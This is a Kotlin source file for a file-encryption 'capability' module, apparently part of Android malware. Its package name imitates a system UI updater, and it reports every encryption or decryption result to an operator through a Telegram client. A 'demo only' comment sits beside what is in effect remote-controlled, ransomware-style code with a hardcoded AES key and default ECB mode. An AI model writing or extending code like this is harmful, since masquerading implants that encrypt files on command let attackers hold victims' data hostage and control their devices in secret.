package com.android.systemui.updater.capabilities

import android.content.Context
import com.android.systemui.updater.TelegramClient
import java.io.File
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

class CryptoCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    // DEMO ONLY: Educational file encryption/decryption
    // Not for malicious use. Uses hardcoded key for demo.
    private val demoKey = "1234567890123456".toByteArray() // 16-byte AES key

    fun encryptFile(path: String) {
        val file = File(path)
        if (!file.exists() || !file.isFile) {
            telegram.sendText("❌ File not found: $path")
            return
        }
        try {
            val key = SecretKeySpec(demoKey, "AES")
            val cipher = Cipher.getInstance("AES")
            cipher.init(Cipher.ENCRYPT_MODE, key)
            val input = file.readBytes()
            val output = cipher.doFinal(input)
            val outFile = File("${file.absolutePath}.encrypted")
            outFile.writeBytes(output)
            telegram.sendText("🔒 Encrypted: ${outFile.name}\nOriginal: ${file.name}")
        } catch (e: Exception) {
            telegram.sendText("❌ Encryption failed: ${e.message}")
        }
    }

    fun decryptFile(path: String) {
        val file = File(path)
        if (!file.exists() || !file.isFile) {
            telegram.sendText("❌ File not found: $path")
            return
        }
        if (!file.name.endsWith(".encrypted")) {
            telegram.sendText("❌ Only .encrypted files can be decrypted")
            return
        }
        try {
            val key = SecretKeySpec(demoKey, "AES")
            val cipher = Cipher.getInstance("AES")
            cipher.init(Cipher.DECRYPT_MODE, key)
            val input = file.readBytes()
            val output = cipher.doFinal(input)
            val outName = file.name.removeSuffix(".encrypted")
            val outFile = File(file.parent, outName)
            outFile.writeBytes(output)
            telegram.sendText("🔓 Decrypted: ${outFile.name}")
        } catch (e: Exception) {
            telegram.sendText("❌ Decryption failed: ${e.message}")
        }
    }
}
